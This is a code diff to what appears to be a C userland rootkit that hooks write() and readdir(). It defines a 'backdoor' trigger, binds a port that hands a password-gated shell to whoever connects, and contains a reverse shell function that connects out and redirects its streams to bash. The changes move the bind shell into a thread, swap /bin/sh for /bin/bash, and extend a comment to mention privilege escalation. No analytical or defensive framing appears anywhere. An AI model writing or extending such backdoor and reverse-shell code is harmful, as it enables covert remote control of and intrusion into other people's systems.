@@ -7,6 +7,10 @@
 #include <netinet/in.h>
 #include <dirent.h>
 #include <arpa/inet.h>
+#include <pthread.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <stdlib.h>
 
 // Backdoor definitions
 #define BACKDOOR_TRIGGER "backdoor"
@@ -25,8 +29,7 @@
 ssize_t (*original_write)(int, const void *, size_t);
 struct dirent *(*original_readdir)(DIR *);
 
-// Backdoor function: Spawn a shell when triggered
-void spawn_backdoor_shell() {
+void *backdoor_thread(void *arg) {
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(BACKDOOR_PORT);
@@ -35,14 +38,14 @@ void spawn_backdoor_shell() {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
         perror("[DEBUG] Socket creation failed for backdoor");
-        return;
+        return NULL;
     }
     const int optval = 1;
     setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
     if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("[DEBUG] Bind failed for backdoor");
         close(sockfd);
-        return;
+        return NULL;
     }
     listen(sockfd, 1);
 
@@ -50,7 +53,7 @@ void spawn_backdoor_shell() {
     if (client_fd < 0) {
         perror("[DEBUG] Accept failed for backdoor");
         close(sockfd);
-        return;
+        return NULL;
     }
 
     char input[50];
@@ -61,13 +64,25 @@ void spawn_backdoor_shell() {
         for (int i = 0; i < 3; i++) {
             dup2(client_fd, i);
         }
-        execve("/bin/sh", NULL, NULL);
+        execve("/bin/bash", NULL, NULL); // Changed to /bin/bash
     } else {
         shutdown(client_fd, SHUT_RDWR);
     }
 
     close(sockfd);
+    return NULL;
 }
+
+// Backdoor function: Spawn a shell when triggered
+void spawn_backdoor_shell() {
+    pthread_t thread;
+    if (pthread_create(&thread, NULL, backdoor_thread, NULL) != 0) {
+        perror("[DEBUG] Failed to create backdoor thread");
+    }
+    // Wait for the thread to finish, causing the program to hang
+    pthread_join(thread, NULL);
+}
+
 
 // Reverse shell function
 void spawn_reverse_shell() {
@@ -91,7 +106,7 @@ void spawn_reverse_shell() {
         for (int i = 0; i < 3; i++) {
             dup2(sockfd, i);
         }
-        execve("/bin/sh", NULL, NULL);
+        execve("/bin/bash", NULL, NULL); // Changed to /bin/bash
     } else {
         perror("[DEBUG] Reverse shell connection failed");
     }
@@ -99,7 +114,7 @@ void spawn_reverse_shell() {
     close(sockfd);
 }
 
-// Hooked write() function: Trigger backdoor or reverse shell
+// Hooked write() function: Trigger backdoor, reverse shell, or privilege escalation
 ssize_t write(int fd, const void *buf, size_t count) {
     // Load the original write function
     if (!original_write) {
